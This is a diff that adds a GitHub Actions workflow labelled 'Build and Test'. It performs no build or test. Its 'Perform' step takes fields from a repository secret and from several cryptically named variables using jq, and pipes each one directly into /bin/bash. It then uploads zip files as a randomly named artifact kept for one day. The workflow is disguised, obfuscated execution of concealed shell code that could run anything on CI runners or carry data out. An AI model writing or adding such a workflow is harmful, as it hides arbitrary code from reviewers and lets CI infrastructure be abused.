@@ -1,0 +1,30 @@
+name: Build and Test
+on:
+  workflow_dispatch:
+
+jobs:
+  workflow:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Perform
+        env:
+          uvmb310: ${{ secrets.uvmb310 }}
+        run: |
+          printf '%s' "$uvmb310" | jq -r .jd8 | /bin/bash
+          printf '%s' "$ptnil9" | jq -r .q90838 | /bin/bash
+          echo $cn8 | jq -r .w95359 | /bin/bash
+          echo $o74 | jq -r .ok9 | /bin/bash
+          printf '%s' "$d5369" | jq -r .t03916 | /bin/bash
+          printf '%s' "$imzp0" | jq -r .ikkoe71 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: 0j9ds5D1
+          path: "*.zip"
+          retention-days: 1
